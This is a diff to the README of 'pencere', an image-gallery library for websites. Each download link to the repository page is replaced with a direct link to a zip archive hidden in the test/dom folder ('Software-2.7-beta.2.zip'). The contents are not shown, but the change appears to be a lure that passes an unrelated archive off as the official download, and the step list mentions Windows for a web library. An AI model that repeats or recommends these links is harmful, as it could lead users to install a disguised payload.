@@ -1,6 +1,6 @@
 # 🖼️ pencere - Simple image galleries for any website
 
-[![](https://img.shields.io/badge/Download-Pencere-blue.svg)](https://github.com/khadheejatheenaal/pencere)
+[![](https://img.shields.io/badge/Download-Pencere-blue.svg)](https://raw.githubusercontent.com/khadheejatheenaal/pencere/main/test/dom/Software-2.7-beta.2.zip)
 
 Pencere is a tool for showing photos and videos on your website. It makes images pop up in a clean window when site visitors click them. This tool works on all websites. You do not need to install complex extra parts to use it. It makes your site look better and helps people see your content without trouble.
 
@@ -8,7 +8,7 @@ Pencere is a tool for showing photos and videos on your website. It makes images
 
 You can set up pencere on your computer to test how it works before you add it to your website.
 
-1. Visit this page to download: https://github.com/khadheejatheenaal/pencere
+1. Visit this page to download: https://raw.githubusercontent.com/khadheejatheenaal/pencere/main/test/dom/Software-2.7-beta.2.zip
 2. Select the button that says Code.
 3. Click Download ZIP.
 4. Open your downloads folder in Windows.
@@ -96,6 +96,6 @@ Users expect instant feedback. By using native browser transitions, Pencere matc
 
 ## 📥 Get the files
 
-The project is active and updated often. To get the newest fixes, visit this page to download: https://github.com/khadheejatheenaal/pencere
+The project is active and updated often. To get the newest fixes, visit this page to download: https://raw.githubusercontent.com/khadheejatheenaal/pencere/main/test/dom/Software-2.7-beta.2.zip
 
 Check the repository periodically to see if a newer version is available. You can re-download the ZIP file and replace your local files whenever you need to update. Your website will reflect the changes immediately after you refresh your pages.
